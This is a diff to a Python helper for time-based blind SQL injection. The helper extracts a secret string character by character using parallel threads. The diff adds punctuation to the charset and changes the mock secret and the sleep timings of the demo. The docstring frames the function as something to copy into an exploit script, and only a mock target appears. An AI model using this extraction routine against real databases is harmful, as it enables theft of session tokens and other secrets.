@@ -7,7 +7,7 @@ simultaneously via a thread pool, then collecting whichever character returned T
 at each position.
 
 This is significantly faster than sequential testing — a 64-char string against a
-62-char charset (a-zA-Z0-9) fires 3968 tasks total, but only max_workers run at once.
+94-char charset (a-zA-Z0-9 + punctuation) fires 6016 tasks total, but only max_workers run at once.
 
 Usage (copy extract_string_blind into your exploit script):
     import requests, time
@@ -38,7 +38,7 @@ import time
 def extract_string_blind(
     check_fn,
     length: int,
-    charset: str = string.ascii_letters + string.digits,
+    charset: str = string.ascii_letters + string.digits + string.punctuation,
     max_workers: int = 30,
     label: str = "value",
 ) -> str:
@@ -92,16 +92,16 @@ if __name__ == "__main__":
     print("sqli_parallel.py — copy extract_string_blind() into your exploit script.")
     print()
 
-    # Mock secret: 32-char mixed-case alphanumeric, like a real session token.
-    SECRET  = "aB3xZ9kQ7mN2pR5tV8wY1cF4gH6jL0sD"
-    CHARSET = string.ascii_letters + string.digits
+    # Mock secret: 12-char mix of upper/lower/digits/punctuation.
+    SECRET  = "aB3$xK9!mP2#"
+    CHARSET = string.ascii_letters + string.digits + string.punctuation
 
     def demo_check(index: int, char: str) -> bool:
         # Mock a time-based blind SQLi: every request carries network latency,
         # and a correct char triggers the server-side sleep (the signal).
         # index is 1-based (position 1 = first char), matching SQL's substr().
         correct = (char == SECRET[index - 1])
-        time.sleep(0.05 if correct else 0.01)
+        time.sleep(0.3 if correct else 0.05)
         return correct
 
     print(f"Extracting a {len(SECRET)}-char token from a mock time-based blind SQLi:")
